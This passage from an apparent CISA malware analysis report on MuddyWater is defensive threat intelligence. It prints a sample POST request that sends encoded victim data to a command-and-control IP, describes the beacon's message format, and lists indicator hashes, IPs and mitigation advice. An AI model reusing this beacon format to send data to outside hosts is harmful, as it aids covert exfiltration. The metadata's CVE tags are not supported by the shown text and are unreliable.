request---\n\n\t\t\tDisplayed below is sample POST request that contains the encoded victim's system data and the output of the command executed:\n\n\t\t\t--Begin request--\n\t\t\tPOST /oeajgyxyxclqmfqayv HTTP/1.1\n\t\t\tConnection: Keep-Alive\n\t\t\tContent-Type: application/x-www-form-urlencoded; Charset=UTF-8\n\t\t\tAccept: */*\n\t\t\tAccept-Language: en-us\n\t\t\tUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\n\t\t\tCharSet: UTF-8\n\t\t\tContent-Length: 5689\n\t\t\tHost: 5[.]199[.]133[.]149\n\n\t\t\tvl=A093273633E2339332927212329A723242D6E6D346365E7226F246E76227271E265674D6469267477C024204601063744215623203A2E202222279426216621227E272052222220296E226262EE60400253446D462D44260577314D223435023231473A36633635F6363270303E6237320E36206220200A20200622222420254226220E277022607260664E0262622E60702762560422202200322222740672742E644C265242C0425E2221722E62705272603A4020542422802228422026422424022322402D2E3223225E20200660602A7268D767776040216727020C2231422D2671726F066777692050634720DA626026606623722F0262662360692262650022262600023E62700060622460632664660F666E6260425E372002262220202E22222209222522232220222F5322222D647E2772571B626F266C472922203302022033782744368C46347730376E4030023232204D2E4235323A254063323379364643463325313062267410766E6660262E627042626220236E2262620E52002206002A62603762763F422947262799202026202625252E0224225E207056776000277C7670664F564C0446736040246622020E32302230222022260322232420272622230A2225232026206475F5706605247502746090664967232464062557626260706E6267720E2630722D32406631A33633683E3042376308366526693664363D6266256523256226273B222032242200706E3260622E263022544335666263606365676DD24624652F0577272644667162656260765EE234324E3330223563093661636A33796235403262203433273034513230223E3240362E3226227E292072272300262563292323222052222420207026627604624524307220422E0222022E706022223200222032202241262202666265606052226202657152707224636A02636433707547252740040E6244227E262002262220292E6326235226266220236E26260022622E6D62046046D65240264D276E270052364260333E6232328536326634306D3734963236243134273227302223262527252223D6222624232E20227040637D266142336264326472206D5E3222225E036022656240627D564422046473267256E4646D4261645F62751726666D69756656262022232524262922201222202A2120262227C92229262E222E6260527262206A7E224322AE2400662436082220C572634061707526569446226260666E666406772060606067666601626146202763060E0206326E606022726200624022606222627402226251606A72606443522526626644665E6276622E7060626622F0666E2372565307005272674F203E66272701272F722D26226264A262622E2A60226277ED727A376E666C6664E77377302E21660307.........EC2C602658246E29E3302A60EE602E600E422E50E5206E6E7E607E209E0E0E202E703E6E052D2E6EE07E232F0E20702E4A2D2E2DAE2E29240A22252E99265D2F0320602900234705142E5F477A2F2C6106612927EC2622250E244D2F8F230420F2397E6CEC225648F56E59609C61706199604C4410625E607022202856253E521D013\n\t\t\t--End request---\n\n\t\t\tIt is designed to send these messages below to the C2 server using the URI: \"http[:]//5[.]199[.]133[.]149/oeajgyxyxclqmfqayv\". Each message sent is hex-encoded, and the hex bytes are re-ordered and appended to a string \"vl\":\n\n\t\t\t--Begin message format--\n\t\t\t\"200/!&^^&!/19x.1xx.2xx.2xx|!)!)!|WIN-HVMLL1IR74C/user01\" ==> When the decoded C2 command data received contains the string \"|!)!)!|\" or \"/!&^^&!/\".\n\t\t\t\"19x.1xx.2xx.2xx|!)!)!|WIN-HVMLL1IR74C/user01|!)!)!|sory\" ==> When a command or a specific task fails\n\t\t\t--End message format--\nScreenshots\n \n\nFigure 21 - The contents of the VBscript.\n\n\n\n5.199.133.149\nTags\ncommand-and-control\nPorts\n\n80 TCP\n\nHTTP Sessions\n\nPOST /jznkmustntblvmdvgcwbvqb HTTP/1.1\n\t\t\t\tConnection: Keep-Alive\n\t\t\t\tContent-Type: application/x-www-form-urlencoded; Charset=UTF-8\n\t\t\t\tAccept: */*\n\t\t\t\tAccept-Language: en-us\n\t\t\t\tUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\n\t\t\t\tCharSet: UTF-8\n\t\t\t\tContent-Length: 93\n\t\t\t\tHost: 5.199.133.149\nPOST /oeajgyxyxclqmfqayv HTTP/1.1\n\t\t\t\tConnection: Keep-Alive\n\t\t\t\tContent-Type: application/x-www-form-urlencoded; Charset=UTF-8\n\t\t\t\tAccept: */*\n\t\t\t\tAccept-Language: en-us\n\t\t\t\tUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\n\t\t\t\tCharSet: UTF-8\n\t\t\t\tContent-Length: 93\n\t\t\t\tHost: 5[.]199[.]133[.]149\n\nWhois\nDomain Name: SERVDISCOUNT-CUSTOMER.COM\n\t\t\tRegistry Domain ID: 1882350046_DOMAIN_COM-VRSN\n\t\t\tRegistrar WHOIS Server: whois.psi-usa.info\n\t\t\tRegistrar URL: http://www.psi-usa.info\n\t\t\tUpdated Date: 2021-10-28T07:05:37Z\n\t\t\tCreation Date: 2014-10-27T07:58:37Z\n\t\t\tRegistry Expiry Date: 2022-10-27T07:58:37Z\n\t\t\tRegistrar: PSI-USA, Inc. dba Domain Robot\n\t\t\tRegistrar IANA ID: 151\n\t\t\tRegistrar Abuse Contact Email: domain-abuse@psi-usa.info\n\t\t\tRegistrar Abuse Contact Phone: +49.94159559482\n\t\t\tDomain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\n\t\t\tName Server: NS1.NTDNS.DE\n\t\t\tName Server: NS2.NTDNS.DE\n\t\t\tName Server: NS3.NTDNS.DE\n\t\t\tDNSSEC: unsigned\n\t\t\tURL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/\n\t\t\t>>> Last update of whois database: 2022-01-31T07:23:45Z <<<\nRelationships\n\n\n\n5.199.133.149\nConnected_From\nd77e268b746cf1547e7ed662598f8515948562e1d188a7f9ddb8e00f4fd94ef0\n\n\n\nDescription\nThe malware C2 IP address.\n\nRelationship Summary\n\n\n\n\n12db8bcee0...\nRelated_To\n2471a039cb1ddeb826f3a11f89b193624d89052afcbee01205dc92610723eb82\n\n\n2471a039cb...\nRelated_To\nce9bd1acf37119ff73b4dff989f2791eb24efc891a413df58856d848f0bcaee9\n\n\n2471a039cb...\nRelated_To\n12db8bcee090521ecf852bf215ce3878737517a22ef1f2ff9bdec7cba8d0d3aa\n\n\nce9bd1acf3...\nRelated_To\n2471a039cb1ddeb826f3a11f89b193624d89052afcbee01205dc92610723eb82\n\n\nce9bd1acf3...\nConnected_To\n185.183.96.7\n\n\n185.183.96.7\nConnected_From\nce9bd1acf37119ff73b4dff989f2791eb24efc891a413df58856d848f0bcaee9\n\n\nb6133e04a0...\nConnected_To\n185.117.75.34\n\n\n185.117.75.34\nConnected_From\ne7f6c7b91c482c12fc905b84dbaa9001ef78dc6a771773e1de4b8eade5431eca\n\n\n185.117.75.34\nConnected_From\nb6133e04a0a1deb8faf944dd79c46c62f725a72ea9f26dd911d6f6e1e4433f1a\n\n\n192.210.191.188\nConnected_From\n5bcdd422089ed96d6711fa251544e2e863b113973db328590cfe0457bfeb564f\n\n\n5bcdd42208...\nConnected_To\n192.210.191.188\n\n\n255e53af8b...\nConnected_To\n185.183.96.44\n\n\n185.183.96.44\nConnected_From\n255e53af8b079c8319ce52583293723551da9affe547da45e2c1d4257cff625a\n\n\ne7f6c7b91c...\nConnected_To\n185.117.75.34\n\n\nb1e30cce6d...\nConnected_To\n185.118.164.21\n\n\n185.118.164.21\nConnected_From\nb1e30cce6df16d83b82b751edca57aa17795d8d0cdd960ecee7d90832b0ee76c\n\n\n185.118.164.21\nConnected_From\n42ca7d3fcd6d220cd380f34f9aa728b3bb68908b49f04d04f685631ee1f78986\n\n\n42ca7d3fcd...\nConnected_To\n185.118.164.21\n\n\n026868713d...\nDropped\nc2badcdfa9b7ece00f245990bb85fb6645c05b155b77deaf2bb7a2a0aacbe49e\n\n\n026868713d...\nDropped\nf10471e15c6b971092377c524a0622edf4525acee42f4b61e732f342ea7c0df0\n\n\nc2badcdfa9...\nDropped_By\n026868713d60e6790f41dc7046deb4e6795825faa903113d2f22b644f0d21141\n\n\nf10471e15c...\nDropped_By\n026868713d60e6790f41dc7046deb4e6795825faa903113d2f22b644f0d21141\n\n\nf10471e15c...\nConnected_To\n88.119.170.124\n\n\n88.119.170.124\nConnected_From\nf10471e15c6b971092377c524a0622edf4525acee42f4b61e732f342ea7c0df0\n\n\n4b2862a166...\nContains\nd77e268b746cf1547e7ed662598f8515948562e1d188a7f9ddb8e00f4fd94ef0\n\n\n4b2862a166...\nContains\ned988768f50f1bb4cc7fb69f9633d6185714a99ecfd18b7b1b88a42a162b0418\n\n\ned988768f5...\nContained_Within\n4b2862a1665a62706f88304406b071a5c9a6b3093daadc073e174ac6d493f26c\n\n\nd77e268b74...\nContained_Within\n4b2862a1665a62706f88304406b071a5c9a6b3093daadc073e174ac6d493f26c\n\n\nd77e268b74...\nConnected_To\n5.199.133.149\n\n\n5.199.133.149\nConnected_From\nd77e268b746cf1547e7ed662598f8515948562e1d188a7f9ddb8e00f4fd94ef0\n\n\n\n\nRecommendations\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\nDisable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file header).\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, \"Guide to Malware Incident Prevention & Handling for Desktops and Laptops\".\n\nContact Information\n\n\n1-888-282-0870\nCISA Central\u00a0(UNCLASS)\nCISA SIPR (SIPRNET)\nCISA IC (JWICS)\n\nCISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this product at the following URL: https://us-cert.cisa.gov/forms/feedback/\n\nDocument FAQ\n\nWhat is a MIFR? A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely manner. In most instances this report will provide initial indicators for computer and network defense. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nWhat is a MAR? A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired via manual reverse engineering. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nCan I edit this document? This document is not to be edited in any way by recipients. All comments or questions related to this document should be directed to the CISA at 1-888-282-0870 or CISA Service Desk.\nCan I submit malware to CISA? Malware samples can be submitted via three methods:\n\nWeb: https://malware.us-cert.gov\nE-Mail: submit@malware.us-cert.gov\nFTP: ftp.malware.us-cert.gov (anonymous)\n\nCISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and phishing-related scams. Reporting forms can be found on CISA's homepage at www.cisa.gov.\n\n\n\n\n\n\n\n\nRevisions\n\nFebruary 24, 2022: Initial Version\n",
  "cves": [
    "CVE-2022-47966",
    "CVE-2022-42475"
  ],
  "techniques": [],
  "advisory": "ar22-055a",
  "title": "MAR\u201310369127\u20131.v1 \u2013 MuddyWater | CISA",
  "source": "analysis-reports",
  "id": "a5e47d613da89d598ccce1af519473fe0b1f0fcbc62f6f7915e85e1dceebc641"
}